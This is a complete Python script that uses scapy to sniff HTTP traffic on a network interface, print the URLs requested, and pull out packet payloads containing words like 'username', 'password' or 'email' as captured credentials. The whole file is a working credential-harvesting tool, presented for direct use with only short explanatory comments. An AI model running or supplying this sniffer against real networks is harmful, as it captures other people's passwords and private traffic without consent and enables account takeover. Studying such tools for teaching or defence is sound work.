#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# uses scapy to start a packet sniffer on a specified interface, and not to store the info in memory

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# Highlights packets that are HTTP Requests

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "login", "email", "user", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


# Goes through a list of keywords to detect when a login may be possible

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[ !!! ] HTTP Request >>>> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[ $$$ ] Possible username/password >>>" + login_info + "\n\n")


# goes through the previous functions to create text alerts in the packet information for important info


sniff("eth0")

# default interface is eth0, input something else if you want to change that
